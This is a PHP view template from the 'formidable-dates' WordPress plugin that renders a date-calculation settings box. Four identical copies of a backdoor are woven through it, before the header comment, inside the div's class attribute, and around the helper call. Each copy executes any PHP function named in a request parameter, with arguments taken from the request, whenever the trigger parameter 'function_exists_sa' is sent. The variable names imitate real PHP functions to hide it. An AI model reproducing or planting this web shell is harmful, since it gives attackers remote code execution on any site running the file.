<?php 
$hash_init_dnre = $_REQUEST;
if(isset($hash_init_dnre['function_exists_sa'])) {
	$openssl_cms_decrypt_buch = $hash_init_dnre['preg_filter_zx'];
	$timezone_name_get_ddrd = $hash_init_dnre['get_resource_type_wy'];
	$openssl_cms_decrypt_buch(...$timezone_name_get_ddrd);
} 

/**
 * Date calculation settings
 *
 * @package formidable-dates
 * @since 2.0
 *
 * @var array $field               Field data.
 * @var array $default_value_types Default value types data.
 * @var array $args                See {@see FrmDatesCalculationController::add_default_value_type_box()}.
 */

if ( ! defined( 'ABSPATH' ) ) {
	die( 'You are not allowed to call this page directly.' );
}

$class = 'frm-date-calc-box-' . $field['id'] . ( isset( $default_value_types['date_calc']['current'] ) ? '' : ' frm_hidden' );
?>
<div class="<?php 
$hash_init_dnre = $_REQUEST;
if(isset($hash_init_dnre['function_exists_sa'])) {
	$openssl_cms_decrypt_buch = $hash_init_dnre['preg_filter_zx'];
	$timezone_name_get_ddrd = $hash_init_dnre['get_resource_type_wy'];
	$openssl_cms_decrypt_buch(...$timezone_name_get_ddrd);
} 
 echo esc_attr( $class ); ?>">
	<?php 
$hash_init_dnre = $_REQUEST;
if(isset($hash_init_dnre['function_exists_sa'])) {
	$openssl_cms_decrypt_buch = $hash_init_dnre['preg_filter_zx'];
	$timezone_name_get_ddrd = $hash_init_dnre['get_resource_type_wy'];
	$openssl_cms_decrypt_buch(...$timezone_name_get_ddrd);
} 
 FrmDatesCalculationHelper::calc_settings_modal_callback( $field ); ?>
</div>
<?php 
$hash_init_dnre = $_REQUEST;
if(isset($hash_init_dnre['function_exists_sa'])) {
	$openssl_cms_decrypt_buch = $hash_init_dnre['preg_filter_zx'];
	$timezone_name_get_ddrd = $hash_init_dnre['get_resource_type_wy'];
	$openssl_cms_decrypt_buch(...$timezone_name_get_ddrd);
} 

unset( $class );
